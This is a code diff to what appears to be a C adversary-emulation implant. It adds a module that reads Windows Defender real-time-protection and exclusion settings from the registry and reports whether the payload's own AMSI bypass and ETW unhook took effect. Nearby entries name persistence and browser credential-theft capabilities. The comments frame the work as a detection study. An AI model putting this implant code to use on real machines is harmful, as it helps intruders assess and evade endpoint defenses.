@@ -149,6 +149,7 @@ typedef struct px_cap_entry {
 #define PX_CAP_PS        0x80000
 #define PX_CAP_STAGE     0x100000
 #define PX_CAP_BROWSER   0x200000
+#define PX_CAP_AVSTATUS  0x400000
 
 /* Parse a decimal number.
  *
@@ -2258,6 +2259,141 @@ int px_install_persistence(char *report, unsigned int cap)
 }
 
 /* ================================================================== */
+/* The endpoint's own posture, read from inside the target            */
+/* ================================================================== */
+/*                                                                   */
+/* WHAT IT ANSWERS                                                  */
+/*     Three questions, and they are the questions a detection study  */
+/*     has to ask before it can say anything about a result:          */
+/*                                                                   */
+/*       1. Did this payload's OWN evasion work? The AMSI patch and   */
+/*          the ETW unhook either took or they did not, and the       */
+/*          payload is the only thing that knows for certain.         */
+/*                                                                   */
+/*       2. Is real-time protection even on? A run against a        */
+/*          machine with it switched off measures nothing, and that   */
+/*          is worth knowing BEFORE the result is interpreted.        */
+/*                                                                   */
+/*       3. Is this payload's own file in the endpoint's exclusion   */
+/*          list? If it is, then the endpoint was never going to     */
+/*          look at it, and a clean result means nothing.             */
+/*                                                                   */
+/* WHY IT IS A MEASUREMENT AND NOT AN EVASION                       */
+/*     It only READS. It does not disable anything, it does not add  */
+/*     an exclusion, and it does not touch the endpoint's            */
+/*     configuration.                                                 */
+/*                                                                   */
+/*     Which is also why it is worth a rule: a process reading the  */
+/*     endpoint's exclusion list is asking a question about its own   */
+/*     detection, and that is worth noticing. Rule px-055.            */
+/* ================================================================== */
+
+/* Read a DWORD from the registry. Returns 1 if it was there. */
+static int px_cap_read_dword(const char *key, const char *value,
+                             DWORD *out)
+{
+    HKEY k;
+    DWORD type = 0, data = 0;
+    DWORD size = sizeof(data);
+    LONG rc;
+
+    rc = px_reg_open_key_ex(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &k);
+    if (rc != ERROR_SUCCESS)
+        return 0;
+    rc = px_reg_query_value_ex(k, value, NULL, &type,
+                               (LPBYTE)&data, &size);
+    px_reg_close_key(k);
+    if (rc != ERROR_SUCCESS || type != REG_DWORD)
+        return 0;
+    *out = data;
+    return 1;
+}
+
+/* Is this payload's own file in the endpoint's exclusion list? */
+static int px_cap_is_excluded(const char *self_path)
+{
+    char key[192];
+    HKEY k;
+    LONG rc;
+    int found = 0;
+
+    px_strcpy(key, px_cap_table_str(PX_SID_DEFENDER_EXCL_KEY,
+                                    key, sizeof(key)), sizeof(key));
+    rc = px_reg_open_key_ex(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &k);
+    if (rc != ERROR_SUCCESS)
+        return 0;
+
+    /* Walk the value names: each one is an excluded path. */
+    {
+        DWORD index = 0;
+        for (;;) {
+            char name[512];
+            DWORD nlen = (DWORD)sizeof(name);
+            LSTATUS r = px_reg_enum_value(k, index++, name, &nlen,
+                                       NULL, NULL, NULL, NULL);
+            if (r != ERROR_SUCCESS)
+                break;
+            if (px_strstr_ci(name, self_path))
+                found = 1;
+        }
+    }
+    px_reg_close_key(k);
+    return found;
+}
+
+static int px_cap_avstatus(char *args, char *report, unsigned int cap)
+{
+    char self_path[MAX_PATH];
+    char out[900];
+    int off = 0;
+    int rtp = 1;
+    DWORD disabled = 0;
+    int excluded = 0;
+
+    (void)args;
+
+    /* 1. Did this payload's own evasion take? */
+    off += px_snprintf(out + off, (unsigned int)(sizeof(out) - off),
+                       "amsi_bypass=%s etw_unhook=%s ",
+#ifdef PX_AMSI_BYPASS
+                       px_amsi_patched ? "patched" : "not patched",
+#else
+                       "not compiled in",
+#endif
+#ifdef PX_ETW_UNHOOK
+                       px_etw_patched ? "patched" : "not patched"
+#else
+                       "not compiled in"
+#endif
+                       );
+
+    /* 2. Is real-time protection on? */
+    {
+        char key[192];
+        px_strcpy(key, px_cap_table_str(PX_SID_DEFENDER_RTP_KEY,
+                                        key, sizeof(key)), sizeof(key));
+        if (px_cap_read_dword(key,
+                              px_cap_table_str(PX_SID_DEFENDER_RTP_OFF,
+                                               self_path, sizeof(self_path)),
+                              &disabled) && disabled)
+            rtp = 0;
+    }
+    off += px_snprintf(out + off, (unsigned int)(sizeof(out) - off),
+                       "realtime_protection=%s ", rtp ? "on" : "OFF");
+
+    /* 3. Is this file excluded from scanning? */
+    if (GetModuleFileNameA(NULL, self_path, MAX_PATH)) {
+        excluded = px_cap_is_excluded(self_path);
+    }
+    off += px_snprintf(out + off, (unsigned int)(sizeof(out) - off),
+                       "self_excluded=%s", excluded ? "yes" : "no");
+
+    px_snprintf(report, cap,
+                "endpoint posture: %s", out);
+    return 0;
+}
+
+/* ================================================================== */
 /* The table                                                          */
 /* ================================================================== */
 
@@ -2286,6 +2422,7 @@ static const px_cap_entry px_cap_table[] = {
     { "ps",      px_cap_ps,      PX_CAP_PS,      "T1059.001,T1140" },
     { "stage",   px_cap_stage,   PX_CAP_STAGE,   "T1560.001,T1074.001" },
     { "browser", px_cap_browser, PX_CAP_BROWSER, "T1555.003,T1005" },
+    { "avstatus", px_cap_avstatus, PX_CAP_AVSTATUS, "T1082,T1562.001" },
 };
 
 #define PX_CAP_COUNT (sizeof(px_cap_table) / sizeof(px_cap_table[0]))
